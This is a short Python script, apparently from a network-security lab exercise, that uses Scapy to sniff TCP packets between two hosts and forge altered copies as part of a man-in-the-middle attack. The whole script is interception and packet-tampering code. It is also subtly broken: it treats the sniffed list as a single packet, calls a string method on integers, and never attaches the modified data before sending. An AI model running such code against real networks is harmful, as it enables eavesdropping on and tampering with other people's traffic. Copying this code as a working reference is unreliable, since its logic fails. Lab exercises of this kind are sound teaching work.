from scapy.all import *

# Step 2: Intercept Packets
IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0A:09:00:05"
MAC_B = "02:42:0A:09:00:06"

f1 = f"tcp and (ether src {MAC_A} or ether src {MAC_B})"
f2 = f"tcp and (src host {IP_A} or dst host {IP_B})"

pkt = sniff(iface='eth0', filter=f1)

data = pkt[TCP].payload.load
print(f"***{data}, length: {len(data)}")
newpkt = IP(pkt[IP])
del(newpkt.chksum)
del(newpkt[TCP].payload) # Remove the payload
del(newpkt[TCP].chksum)

data_list = list(data)

# Inspect each single element
for i in range(0, len(data_list)):
    if chr(data_list[i].isalpha()):
        data_list[i] = ord('A')

# Turn list back to bytes
newdata = bytes(data_list)

# Send the new packet
send(newpkt)